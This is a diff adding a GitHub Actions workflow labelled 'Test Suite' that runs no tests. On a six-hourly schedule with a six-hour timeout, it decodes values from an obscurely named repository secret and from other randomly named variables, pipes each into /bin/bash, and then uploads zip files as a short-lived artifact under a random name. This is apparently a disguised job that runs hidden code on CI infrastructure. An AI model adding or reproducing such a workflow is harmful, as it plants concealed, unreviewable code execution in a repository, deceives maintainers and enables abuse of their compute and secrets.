@@ -1,0 +1,41 @@
+name: Test Suite
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '31 5,11,17,23 * * *'
+permissions:
+  contents: read
+  actions: read
+env:
+  CI: true
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  task:
+    name: Main task
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Execute
+        env:
+          spzx9489: ${{ secrets.spzx9489 }}
+        run: |
+          printf '%s' "$spzx9489" | jq -r .av81222 | /bin/bash
+          printf '%s' "$xweor149" | jq -r .jd98 | /bin/bash
+          echo $drae887 | jq -r .p9 | /bin/bash
+          echo $n51462 | jq -r .jalhk5 | /bin/bash
+          printf '%s' "$qkh99" | jq -r .m22325 | /bin/bash
+
+      - name: Upload artifact
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: iK0x2UTX
+          path: "*.zip"
+          retention-days: 1
